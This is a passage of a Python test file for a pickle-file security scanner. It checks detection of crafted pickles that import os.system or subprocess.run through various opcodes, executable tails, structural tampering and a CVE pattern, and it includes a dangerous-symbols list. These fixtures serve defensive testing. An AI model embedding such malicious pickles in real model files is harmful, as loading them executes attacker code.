    ids=["dup-pop", "mark-pop", "none-pop"],
)
def test_post_budget_scan_detects_interleaved_prememoized_stack_global_tail(
    tmp_path: Path,
    tail: bytes,
) -> None:
    path = tmp_path / "post-budget-prememo-interleaved-stack-global.pkl"
    path.write_bytes(_make_pre_memoized_post_budget_stack_global_payload(tail))

    result = PickleScanner({"max_opcodes": 7, "post_budget_global_scan_limit_bytes": 4096}).scan(str(path))

    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("pickle_rule_code") == "POST_BUDGET_GLOBAL"
        and issue.details.get("module") == "subprocess"
        and issue.details.get("name") == "run"
        for issue in result.issues
    ), result.issues
    assert result.success is False


@pytest.mark.parametrize(
    "tail",
    [
        _short_binunicode(b"subprocess") + b"q\x05" + _short_binunicode(b"run") + b"q\x06h\x05h\x06\x93)R.",
        _short_binunicode(b"subprocess") + b"p5\n" + _short_binunicode(b"run") + b"p6\ng5\ng6\n\x93)R.",
        _short_binunicode(b"subprocess") + b"\x94" + _short_binunicode(b"run") + b"\x94h\x00h\x01\x93)R.",
    ],
    ids=["binput-binget", "put-get", "memoize-binget"],
)
def test_post_budget_scan_tracks_tail_local_memo_stack_global_tail(tmp_path: Path, tail: bytes) -> None:
    path = tmp_path / "post-budget-tail-local-memo-stack-global.pkl"
    path.write_bytes(b"\x80\x04\x88" + tail)

    result = PickleScanner({"max_opcodes": 2, "post_budget_global_scan_limit_bytes": 4096}).scan(str(path))

    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("pickle_rule_code") == "POST_BUDGET_GLOBAL"
        and issue.details.get("module") == "subprocess"
        and issue.details.get("name") == "run"
        for issue in result.issues
    ), result.issues
    assert result.success is False


def test_scan_bounds_follow_on_probe_recursion_for_pickle_like_binary_tail(tmp_path: Path) -> None:
    path = tmp_path / "binary-tail.pkl"
    path.write_bytes(pickle.dumps({"safe": True}, protocol=2) + (b"XYZNmore-binary-data" * 20))

    result = PickleScanner().scan(str(path))

    assert result.metadata["pickle_primary_engine"] == "rust"
    assert result.metadata["pickle_report_status"] == "inconclusive"
    assert not any(issue.details.get("pickle_notice_code") == "follow_on_stream_detected" for issue in result.issues)
    assert not any(check.name == "Pickle Expansion Heuristic Check" for check in result.checks)
    assert not any(check.name == "Pickle Structural Tamper Check" for check in result.checks)


def test_duplicate_proto_same_version_reports_structural_tamper(tmp_path: Path) -> None:
    path = tmp_path / "duplicate-proto.pkl"
    path.write_bytes(b"\x80\x02\x80\x02K\x01.")

    result = PickleScanner().scan(str(path))
    structural_checks = [
        check
        for check in result.checks
        if check.name == "Pickle Structural Tamper Check" and check.status.value == "failed"
    ]

    assert any(check.details.get("tamper_type") == "duplicate_proto" for check in structural_checks), (
        f"Expected duplicate_proto finding, got: {[check.details for check in structural_checks]}"
    )
    assert any(check.details.get("tamper_type") == "misplaced_proto" for check in structural_checks), (
        f"Expected misplaced_proto finding, got: {[check.details for check in structural_checks]}"
    )
    assert any(check.details.get("position") == 2 for check in structural_checks), (
        f"Expected duplicate/misplaced PROTO position, got: {[check.details for check in structural_checks]}"
    )


def test_duplicate_proto_mixed_versions_reports_structural_tamper(tmp_path: Path) -> None:
    path = tmp_path / "duplicate-proto-mixed.pkl"
    path.write_bytes(b"\x80\x02\x80\x04K\x01.")

    result = PickleScanner().scan(str(path))
    structural_checks = [check for check in result.checks if check.name == "Pickle Structural Tamper Check"]
    duplicate = [check for check in structural_checks if check.details.get("tamper_type") == "duplicate_proto"]

    assert duplicate, f"Expected duplicate_proto finding, got: {[check.details for check in structural_checks]}"
    assert any(
        check.details.get("previous_protocol") == 2 and check.details.get("protocol") == 4 for check in duplicate
    ), f"Expected previous/current protocol details, got: {[check.details for check in duplicate]}"


def test_misplaced_proto_reports_structural_tamper(tmp_path: Path) -> None:
    path = tmp_path / "misplaced-proto.pkl"
    path.write_bytes(b"K\x01\x80\x02.")

    result = PickleScanner().scan(str(path))

    assert any(
        check.name == "Pickle Structural Tamper Check" and check.details.get("tamper_type") == "misplaced_proto"
        for check in result.checks
    ), f"Expected misplaced_proto finding, got: {[check.details for check in result.checks]}"


def test_valid_single_and_multi_stream_proto_stays_without_structural_tamper(tmp_path: Path) -> None:
    single_path = tmp_path / "single.pkl"
    single_path.write_bytes(pickle.dumps({"safe": True}, protocol=4))

    single_result = PickleScanner().scan(str(single_path))

    assert not any(check.name == "Pickle Structural Tamper Check" for check in single_result.checks)

    multi_stream = io.BytesIO()
    pickle.dump({"a": 1}, multi_stream, protocol=2)
    multi_stream.write(b"\x00")
    pickle.dump({"b": 2}, multi_stream, protocol=4)
    multi_path = tmp_path / "multi.pkl"
    multi_path.write_bytes(multi_stream.getvalue())

    multi_result = PickleScanner().scan(str(multi_path))

    assert not any(check.name == "Pickle Structural Tamper Check" for check in multi_result.checks)


def test_structural_tamper_in_second_stream_is_detected(tmp_path: Path) -> None:
    stream = io.BytesIO()
    pickle.dump({"safe": True}, stream, protocol=2)
    stream.write(b"\x00")
    stream.write(b"\x80\x02\x80\x02K\x01.")
    path = tmp_path / "second-stream-duplicate-proto.pkl"
    path.write_bytes(stream.getvalue())

    result = PickleScanner().scan(str(path))
    structural_checks = [check for check in result.checks if check.name == "Pickle Structural Tamper Check"]

    assert any(check.details.get("tamper_type") == "duplicate_proto" for check in structural_checks), (
        f"Expected duplicate_proto finding in later stream, got: {[check.details for check in structural_checks]}"
    )
    assert any(check.details.get("stream_offset", 0) > 0 for check in structural_checks), (
        f"Expected later-stream offset, got: {[check.details for check in structural_checks]}"
    )


def test_structural_tamper_and_malicious_import_both_reported(tmp_path: Path) -> None:
    path = tmp_path / "duplicate-proto-os-system.pkl"
    path.write_bytes(b"\x80\x02\x80\x02cos\nsystem\n)R.")

    result = PickleScanner().scan(str(path))

    assert any(check.name == "Pickle Structural Tamper Check" for check in result.checks)
    assert any(
        issue.severity == IssueSeverity.CRITICAL and issue.details.get("associated_global") == "os.system"
        for issue in result.issues
    ), f"Expected CRITICAL os.system finding, got: {[issue.message for issue in result.issues]}"


def test_structural_tamper_with_safe_ml_payload_preserves_rust_warning_severity(tmp_path: Path) -> None:
    safe_payload = pickle.dumps({"layer": "linear", "shape": [4, 8]}, protocol=2)
    path = tmp_path / "safe-ml-duplicate-proto.pkl"
    path.write_bytes(b"\x80\x02" + safe_payload)

    result = PickleScanner().scan(str(path))
    structural_checks = [check for check in result.checks if check.name == "Pickle Structural Tamper Check"]

    assert structural_checks, "Expected structural tamper finding for duplicate/misplaced PROTO"
    assert all(check.severity == IssueSeverity.WARNING for check in structural_checks)


def test_root_legacy_metadata_detectors_preserve_import_only_and_main_build_rules() -> None:
    scanner = PickleScanner()
    result = ScanResult(scanner_name="pickle", scanner=scanner)
    result.metadata["import_references"] = [
        {
            "import_reference": "tests.test_pickle_scanner.__dict__",
            "module": "tests.test_pickle_scanner",
            "name": "__dict__",
            "opcode": "GLOBAL",
            "position": 257,
            "is_dangerous": False,
        },
        {
            "import_reference": "__main__.CustomModel",
            "module": "__main__",
            "name": "CustomModel",
            "opcode": "STACK_GLOBAL",
            "position": 42,
            "is_dangerous": False,
        },
    ]

    scanner._add_root_legacy_metadata_detectors(result, "payload.pkl")

    assert {issue.rule_code for issue in result.issues} >= {"S206", "S207"}
    assert any("tests.test_pickle_scanner.__dict__" in issue.message for issue in result.issues)
    assert any("__main__.CustomModel" in issue.message for issue in result.issues)


def test_scan_stream_preserves_copyreg_extension_reduce_detection() -> None:
    payload = b"\x80\x04\x82\x01)R."

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="extension-reduce.pkl")

    assert any(
        issue.rule_code == "S201" and issue.details.get("associated_global") == "__copyreg_extension__.code_1"
        for issue in result.issues
    )


def test_scan_stream_does_not_treat_system_name_as_setitem_cve() -> None:
    payload = b"cos\nsystem\n."

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="global-only.pkl")

    assert any(issue.details.get("associated_global") == "os.system" for issue in result.issues)
    assert all(issue.rule_code != "S310" for issue in result.issues)
    assert all(issue.rule_code != "S209" for issue in result.issues)


def test_scan_stream_accepts_unknown_size_stream() -> None:
    payload = pickle.dumps({"safe": True}, protocol=4)

    result = PickleScanner().scan_stream(io.BytesIO(payload), None, source="unknown-size.pkl")

    assert result.success is True
    assert result.metadata["pickle_primary_engine"] == "rust"


def test_scan_stream_handles_seekable_stream_position_failures() -> None:
    payload = pickle.dumps({"safe": True}, protocol=4)

    result = PickleScanner().scan_stream(BrokenTellStream(payload), len(payload), source="broken-tell.pkl")

    assert result.success is False
    assert result.metadata["operational_error_reason"] == "stream_position_failed"
    assert any(issue.details.get("category") == "stream_position_failed" for issue in result.issues)


def test_scan_stream_unknown_size_non_seekable_payload_above_root_cap_returns_truncated_result() -> None:
    payload = pickle.dumps({"pad": b"A" * 4096}, protocol=4)

    result = PickleScanner(config={"pickle_root_raw_scan_limit_bytes": 64}).scan_stream(
        NonSeekableBytesIO(payload),
        None,
        source="large-nonseek.pkl",
    )

    assert result.metadata["pickle_stream_truncated_for_root_scan"] is True
    assert result.metadata["pickle_stream_bytes_buffered"] == 64
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert result.metadata.get("operational_error_reason") != "short_read"
    assert result.success is False
    assert not any(issue.details.get("category") == "short_read" for issue in result.issues)
    assert any(check.name == "Pickle Stream Read Limit" for check in result.checks)


def test_scan_stream_non_seekable_known_size_caps_root_payload_buffer() -> None:
    payload = pickle.dumps({"pad": b"A" * 4096}, protocol=4)

    result = PickleScanner(config={"max_known_stream_read_bytes": 64}).scan_stream(
        NonSeekableBytesIO(payload),
        len(payload),
        source="known-large-nonseek.pkl",
    )

    assert result.success is False
    assert result.metadata["pickle_stream_truncated_for_root_scan"] is True
    assert result.metadata["pickle_stream_bytes_buffered"] == 64
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert any(check.name == "Pickle Stream Read Limit" for check in result.checks)


def test_scan_stream_detects_binary_tail_past_raw_window() -> None:
    pickle_payload = pickle.dumps({"pad": b"A" * 256}, protocol=4)
    payload = pickle_payload + b"\x7fELF/bin/sh\x00"

    result = PickleScanner(config={"pickle_root_raw_scan_limit_bytes": 64}).scan_stream(
        NonSeekableBytesIO(payload),
        len(payload),
        source="stream-tail.bin",
    )

    assert any(
        issue.rule_code == "S502" and issue.details.get("offset") == len(pickle_payload) for issue in result.issues
    )


def test_scan_stream_detects_seekable_binary_tail_from_current_position() -> None:
    prefix = b"WRAPPED:"
    pickle_payload = pickle.dumps({"safe": True}, protocol=4)
    payload = pickle_payload + b"\x7fELF/bin/sh\x00"
    stream = io.BytesIO(prefix + payload)
    stream.seek(len(prefix))

    result = PickleScanner().scan_stream(stream, len(payload), source="embedded-tail.bin")

    expected_offset = len(prefix) + len(pickle_payload)
    assert any(issue.rule_code == "S502" and issue.details.get("offset") == expected_offset for issue in result.issues)


def test_extract_metadata_uses_pickle_opcodes_not_raw_bytes(tmp_path: Path) -> None:
    path = tmp_path / "safe.pkl"
    path.write_bytes(pickle.dumps({"letter": "R", "word": "build"}, protocol=4))

    metadata = PickleScanner().extract_metadata(str(path))

    assert metadata["has_dangerous_opcodes"] is False
    assert metadata["dangerous_opcodes"] == []
    assert metadata["total_opcodes"] > 0


@pytest.mark.parametrize(
    ("configured_limit", "expected_error"),
    [
        (0, "max_metadata_pickle_read_size must be greater than 0"),
        (-1, "max_metadata_pickle_read_size must be greater than 0"),
        ("invalid", "max_metadata_pickle_read_size must be greater than 0"),
        (10 * 1024 * 1024 + 1, "max_metadata_pickle_read_size too large (max: 10485760)"),
    ],
)
def test_extract_metadata_validates_pickle_read_limit(
    tmp_path: Path,
    configured_limit: object,
    expected_error: str,
) -> None:
    path = tmp_path / "safe.pkl"
    path.write_bytes(pickle.dumps({"safe": True}, protocol=4))

    metadata = PickleScanner(config={"max_metadata_pickle_read_size": configured_limit}).extract_metadata(str(path))

    assert metadata["extraction_error"] == expected_error


def test_scan_bin_file_detects_executable_tail_after_pickle_stream(tmp_path: Path) -> None:
    path = tmp_path / "model.bin"
    path.write_bytes(pickle.dumps({"safe": True}, protocol=4) + b"\x7fELF/bin/sh\x00")

    result = PickleScanner().scan(str(path))

    assert result.success is False
    assert any(issue.rule_code == "S502" for issue in result.issues)


def test_scan_pytorch_extension_detects_executable_tail_after_pickle_stream(tmp_path: Path) -> None:
    path = tmp_path / "model.pt"
    path.write_bytes(pickle.dumps({"safe": True}, protocol=4) + b"\x7fELF/bin/sh\x00")

    result = PickleScanner().scan(str(path))

    assert result.success is False
    assert any(issue.rule_code == "S502" for issue in result.issues)


def test_scan_file_detects_executable_tail_past_raw_scan_window(tmp_path: Path) -> None:
    pickle_payload = pickle.dumps({"pad": b"A" * 256}, protocol=4)
    path = tmp_path / "large-tail.bin"
    path.write_bytes(pickle_payload + b"\x7fELF/bin/sh\x00")

    result = PickleScanner(config={"pickle_root_raw_scan_limit_bytes": 64}).scan(str(path))

    assert any(
        issue.rule_code == "S502" and issue.details.get("offset") == len(pickle_payload) for issue in result.issues
    )


def test_scan_file_detects_executable_tail_after_malformed_pickle_prefix(tmp_path: Path) -> None:
    path = tmp_path / "malformed-tail.bin"
    path.write_bytes(b"\x80\x04}JUNK\x7fELF/bin/sh\x00")

    result = PickleScanner().scan(str(path))

    assert any(issue.rule_code == "S502" and issue.details.get("offset") == 7 for issue in result.issues)


def test_scan_bin_file_pe_tail_requires_pe_evidence(tmp_path: Path) -> None:
    path = tmp_path / "model.bin"
    path.write_bytes(pickle.dumps({"safe": True}, protocol=4) + b"MZ benign initials")

    result = PickleScanner().scan(str(path))

    assert not any(issue.rule_code == "S501" for issue in result.issues)


def test_scan_bin_file_detects_pe_tail_with_dos_stub(tmp_path: Path) -> None:
    path = tmp_path / "model.bin"
    path.write_bytes(
        pickle.dumps({"safe": True}, protocol=4) + b"MZ" + (b"\x00" * 30) + b"This program cannot be run in DOS mode"
    )

    result = PickleScanner().scan(str(path))

    assert any(issue.rule_code == "S501" for issue in result.issues)


def test_raw_cve_setitem_detection_ignores_unparsed_tail_strings(tmp_path: Path) -> None:
    path = tmp_path / "tail.pkl"
    path.write_bytes(pickle.dumps({"safe": True}, protocol=4) + b"os.system")

    result = PickleScanner().scan(str(path))

    assert all(
        not (issue.details.get("cve_id") == "CVE-2026-24747" and issue.rule_code in {"S209", "S310"})
        for issue in result.issues
    )


def test_raw_cve_setitem_detection_is_not_suppressed_by_comment_token(tmp_path: Path) -> None:
    path = tmp_path / "comment-token-setitem.pkl"
    path.write_bytes(b"(dS'_rebuild_tensor # comment token is not a bypass'\nS'value'\ns.")

    result = PickleScanner().scan(str(path))

    assert any(issue.details.get("cve_id") == "CVE-2026-24747" for issue in result.issues)
    assert any(issue.rule_code == "S209" for issue in result.issues)


def test_raw_cve_attributions_are_deduplicated_by_rule(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from modelaudit.detectors import cve_patterns

    def duplicate_analyze_cve_patterns(_content: str, _binary_content: bytes = b"") -> list[Any]:
        return [
            cve_patterns.CVEAttribution(
                cve_id="CVE-2026-24747",
                description="PyTorch weights_only restricted unpickler SETITEM abuse pattern",
                severity="CRITICAL",
                cvss=9.8,
                cwe="CWE-502",
                affected_versions="PyTorch versions before the fixed release",
                remediation="Upgrade PyTorch and avoid loading untrusted pickle checkpoints",
                patterns_matched=["_rebuild_tensor", "SETITEM opcode"],
            ),
            cve_patterns.CVEAttribution(
                cve_id="CVE-2026-24747",
                description="Duplicate SETITEM attribution",
                severity="CRITICAL",
                cvss=9.8,
                cwe="CWE-502",
                affected_versions="PyTorch versions before the fixed release",
                remediation="Upgrade PyTorch and avoid loading untrusted pickle checkpoints",
                patterns_matched=["_rebuild_tensor", "SETITEM opcode"],
            ),
        ]

    monkeypatch.setattr(cve_patterns, "analyze_cve_patterns", duplicate_analyze_cve_patterns)
    path = tmp_path / "duplicate-setitem-attribution.pkl"
    path.write_bytes(b"(dS'_rebuild_tensor # comment token is not a bypass'\nS'value'\ns.")

    result = PickleScanner().scan(str(path))

    cve_issues = [
        issue
        for issue in result.issues
        if issue.rule_code == "S209" and issue.details.get("cve_id") == "CVE-2026-24747"
    ]
    assert len(cve_issues) == 1
    assert result.metadata["cve_count"] == 1
    assert len(result.metadata["cve_attributions"]) == 1


def test_analyze_cve_patterns_deduplicates_attributions() -> None:
    from modelaudit.detectors import cve_patterns

    attributions = cve_patterns.analyze_cve_patterns(
        "_rebuild_tensor SETITEM _rebuild_tensor SETITEM",
    )
    cve_ids = [attribution.cve_id for attribution in attributions]

    assert cve_ids.count("CVE-2026-24747") == 1
    assert len(cve_ids) == len(set(cve_ids))


def test_raw_cve_comment_only_text_does_not_trigger_setitem(tmp_path: Path) -> None:
    path = tmp_path / "comment-only.pkl"
    path.write_bytes(
        pickle.dumps({"doc": "# _rebuild_tensor SETITEM storage_offset nbytes\n# documentation only"}, protocol=4)
    )

    result = PickleScanner().scan(str(path))

    assert not any(issue.details.get("cve_id") == "CVE-2026-24747" for issue in result.issues)


def test_raw_cve_rebuild_tensor_global_is_not_suppressed_by_documentation_literal(tmp_path: Path) -> None:
    path = tmp_path / "doc-literal-real-global.pkl"
    path.write_bytes(
        b"(dS'doc'\nS'# _rebuild_tensor\\n# documentation only'\nsctorch\n_rebuild_tensor_v2\nS'value'\ns."
    )

    result = PickleScanner().scan(str(path))

    assert any(issue.details.get("cve_id") == "CVE-2026-24747" for issue in result.issues)
    assert result.metadata["primary_cve"] == "CVE-2026-24747"


def test_rebuild_tensor_documentation_literal_detector_behavior() -> None:
    doc_only_payload = pickle.dumps({"doc": "# _rebuild_tensor\n# documentation only"}, protocol=4)
    real_global_payload = (
        b"(dS'doc'\nS'# _rebuild_tensor\\n# documentation only'\nsctorch\n_rebuild_tensor_v2\nS'value'\ns."
    )

    assert _rebuild_tensor_indicators_are_documentation_literals(doc_only_payload) is True
    assert _rebuild_tensor_indicators_are_documentation_literals(real_global_payload) is False


def test_raw_cve_rebuild_tensor_doc_filter_uses_rust_import_metadata(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setattr(
        "modelaudit.scanners.pickle_scanner._rebuild_tensor_indicators_are_documentation_literals",
        lambda _data: True,
    )
    path = tmp_path / "rust-rebuild-tensor-global.pkl"
    path.write_bytes(
        b"(dS'doc'\nS'# _rebuild_tensor\\n# documentation only'\nsctorch\n_rebuild_tensor_v2\nS'value'\ns."
    )

    result = PickleScanner().scan(str(path))

    assert any(issue.details.get("cve_id") == "CVE-2026-24747" for issue in result.issues)
    assert any(
        reference.get("import_reference") == "torch._rebuild_tensor_v2"
        for reference in result.metadata["import_references"]
    )


def test_opcode_summary_tracks_memoized_stack_global_through_structure(tmp_path: Path) -> None:
    payload = b"\x80\x04\x8c\x02os\x94}\x94\x8c\x06system\x94h\x00h\x02\x93s."
    path = tmp_path / "memoized-stack-global.pkl"
    path.write_bytes(payload)

    summary = _pickle_opcode_summary(payload)
    result = PickleScanner().scan(str(path))

    assert summary["dangerous_globals"] == ["os.system"]
    assert any(
        issue.rule_code == "S209" and issue.details.get("associated_global") == "os.system" for issue in result.issues
    )


def test_raw_cve_setitem_scan_uses_rust_metadata_not_python_opcode_summary(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    def fail_opcode_summary(_payload: bytes) -> dict[str, Any]:
        raise AssertionError("scan path should use Rust opcode metadata")

    monkeypatch.setattr("modelaudit.scanners.pickle_scanner._pickle_opcode_summary", fail_opcode_summary)
    path = tmp_path / "rust-metadata-stack-global.pkl"
    path.write_bytes(b"\x80\x04\x8c\x02os\x94}\x94\x8c\x06system\x94h\x00h\x02\x93s.")

    result = PickleScanner().scan(str(path))

    assert any(
        issue.rule_code == "S209" and issue.details.get("associated_global") == "os.system" for issue in result.issues
    )


def test_opcode_summary_uses_cpython_memoize_indexing_after_explicit_put() -> None:
    payload = b"\x80\x04\x8c\x02osq\x05\x8c\x06system\x94h\x05h\x01\x93."

    summary = _pickle_opcode_summary(payload)

    assert summary["dangerous_globals"] == ["os.system"]


def test_scan_stream_enforces_size_limit() -> None:
    payload = pickle.dumps({"safe": True}, protocol=4)

    result = PickleScanner(config={"max_file_read_size": 4}).scan_stream(
        io.BytesIO(payload),
        len(payload),
        source="too-large.pkl",
    )

    assert result.success is False
    assert any(check.name == "File Size Limit" for check in result.checks)


def test_direct_scan_delegates_zip_backed_pytorch_container(tmp_path: Path) -> None:
    path = create_mock_pytorch_zip(tmp_path / "model.pt", malicious=True)

    result = PickleScanner().scan(str(path))

    assert result.scanner_name == "pytorch_zip"
    assert any(issue.details.get("pickle_filename") == "data.pkl" for issue in result.issues)


def test_pickle_scanner_delegates_jax_specific_patterns_for_jax_pickles(tmp_path: Path) -> None:
    path = tmp_path / "jax_state.pickle"
    path.write_bytes(
        pickle.dumps(
            {
                "framework": "jax",
                "payload": "jax.experimental.io_callback",
            }
        )
    )

    result = PickleScanner().scan(str(path))

    assert any(
        check.name == "JAX Pattern Security Check"
        and check.status == CheckStatus.FAILED
        and check.details["pattern"] == r"jax\.experimental\.io_callback"
        for check in result.checks
    )


def test_contains_any_jax_indicator_reuses_lowered_text() -> None:
    class TrackingStr(str):
        lower_calls = 0

        def lower(self) -> str:
            self.lower_calls += 1
            return super().lower()

    text = TrackingStr("jax")

    assert _contains_any_jax_indicator(text, ("jax", "flax", "haiku")) is True
    assert text.lower_calls == 1


def test_pickle_scanner_delegates_jax_patterns_for_pkl_suffixes(tmp_path: Path) -> None:
    path = tmp_path / "jax_state.pkl"
    path.write_bytes(pickle.dumps({"payload": "jax.experimental.io_callback"}))

    result = PickleScanner().scan(str(path))

    assert any(
        check.name == "JAX Pattern Security Check"
        and check.status == CheckStatus.FAILED
        and check.details["pattern"] == r"jax\.experimental\.io_callback"
        for check in result.checks
    )


def test_pickle_scanner_skips_jax_delegation_for_complete_non_jax_payloads(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "plain_state.pkl"
    payload = pickle.dumps({"payload": "ordinary pickle state"})
    path.write_bytes(payload)

    scanner = PickleScanner()
    result = scanner._create_result()

    def fail_if_called(path: str, text: str) -> ScanResult:
        raise AssertionError("JAX checkpoint delegation should be skipped")

    monkeypatch.setattr(
        "modelaudit.scanners.jax_checkpoint_scanner.JaxCheckpointScanner.scan_pickle_pattern_text",
        fail_if_called,
    )

    scanner._scan_jax_checkpoint_patterns_if_needed(str(path), len(payload), payload, result)


def test_pickle_scanner_uses_jax_window_beyond_root_raw_scan_limit(tmp_path: Path) -> None:
    path = tmp_path / "late-jax.pkl"
    path.write_bytes(pickle.dumps({"padding": "a" * 256, "payload": "jax.experimental.io_callback"}))

    result = PickleScanner(
        config={
            "pickle_root_raw_scan_limit_bytes": 64,
            "jax_pickle_max_scan_bytes": 1024,
        }
    ).scan(str(path))

    assert any(
        check.name == "JAX Pattern Security Check"
        and check.status == CheckStatus.FAILED
        and check.details["pattern"] == r"jax\.experimental\.io_callback"
        for check in result.checks
    )


def test_pickle_scanner_delegates_late_jax_patterns_for_ckpt_suffixes(tmp_path: Path) -> None:
    path = tmp_path / "late-jax.ckpt"
    path.write_bytes(pickle.dumps({"padding": "a" * 9000, "payload": "jax.experimental.io_callback"}))

    result = PickleScanner().scan(str(path))

    assert any(
        check.name == "JAX Pattern Security Check"
        and check.status == CheckStatus.FAILED
        and check.details["pattern"] == r"jax\.experimental\.io_callback"
        for check in result.checks
    )


def test_pickle_scanner_reports_info_only_jax_truncation_without_jax_context(tmp_path: Path) -> None:
    path = tmp_path / "large-benign.pkl"
    path.write_bytes(pickle.dumps({"padding": "a" * 4096}))

    result = PickleScanner(config={"jax_pickle_max_scan_bytes": 1024}).scan(str(path))

    prefix_limit_checks = [check for check in result.checks if check.name == "Pickle Checkpoint Prefix Scan Limit"]
    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == ["jax_pickle_scan_limit_exceeded"]
    assert len(prefix_limit_checks) == 1
    assert prefix_limit_checks[0].severity == IssueSeverity.INFO


def test_pickle_scanner_fails_closed_when_jax_payload_is_after_delegated_scan_window(tmp_path: Path) -> None:
    path = tmp_path / "late-hidden-jax.pkl"
    path.write_bytes(pickle.dumps({"padding": "a" * 4096, "payload": "jax.experimental.io_callback"}))

    result = PickleScanner(config={"jax_pickle_max_scan_bytes": 1024}).scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == ["jax_pickle_scan_limit_exceeded"]
    assert any(check.name == "Pickle Checkpoint Prefix Scan Limit" for check in result.checks)
    assert not any(
        check.name == "JAX Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_policy_compatibility_exports_cover_required_dangerous_symbols() -> None:
    assert {"os.system", "subprocess.Popen", "eval", "exec", "__import__"} <= ALWAYS_DANGEROUS_FUNCTIONS
    assert {"os", "subprocess", "posix", "nt"} <= ALWAYS_DANGEROUS_MODULES
    assert is_suspicious_global("builtins", "eval") is True
    assert is_suspicious_global("builtins", "len") is False
    assert is_suspicious_global("os", "system") is True
    assert is_suspicious_global("os.path", "join") is False
    assert _is_dangerous_module("os.path") is False
    assert is_suspicious_global("json", "loads") is False


def test_legitimate_serialization_file_uses_rust_scan(tmp_path: Path) -> None:
    safe_path = tmp_path / "safe.joblib"
    safe_path.write_bytes(b"\x80\x04cjoblib.numpy_pickle\nNumpyArrayWrapper\nq\x00.")
    malicious_path = tmp_path / "evil.joblib"
    malicious_path.write_bytes(pickle.dumps(MaliciousPayload(), protocol=4))
    text_path = tmp_path / "not-pickle.joblib"
    text_path.write_text("not a pickle", encoding="utf-8")

    assert _is_legitimate_serialization_file(str(safe_path)) is True
    assert _is_legitimate_serialization_file(str(malicious_path)) is False
    assert _is_legitimate_serialization_file(str(text_path)) is False


def test_legitimate_serialization_file_skips_call_graph_enrichment(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    safe_path = tmp_path / "safe.joblib"
    safe_path.write_bytes(b"\x80\x04cjoblib.numpy_pickle\nNumpyArrayWrapper\nq\x00.")

    def fail_call_graph_enrichment(_report: object) -> object:
        raise AssertionError("validation helper should use native Rust findings only")

    monkeypatch.setattr("modelaudit_picklescan.api._with_call_graph_findings", fail_call_graph_enrichment)

    assert _is_legitimate_serialization_file(str(safe_path)) is True


def test_legitimate_serialization_file_keeps_bounded_file_reads(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    safe_path = tmp_path / "safe.joblib"
    safe_path.write_bytes(b"\x80\x04cjoblib.numpy_pickle\nNumpyArrayWrapper\nq\x00.")

    def fail_read_bytes(_path: Path) -> bytes:
        raise AssertionError("validation helper should preserve bounded scanner reads")

    monkeypatch.setattr(Path, "read_bytes", fail_read_bytes)

    assert _is_legitimate_serialization_file(str(safe_path)) is True


def test_scan_missing_path_fails_closed(tmp_path: Path) -> None:
    path = tmp_path / "missing.pkl"

    result = PickleScanner().scan(str(path))

    assert result.success is False
    assert any(check.name == "Path Exists" for check in result.checks)
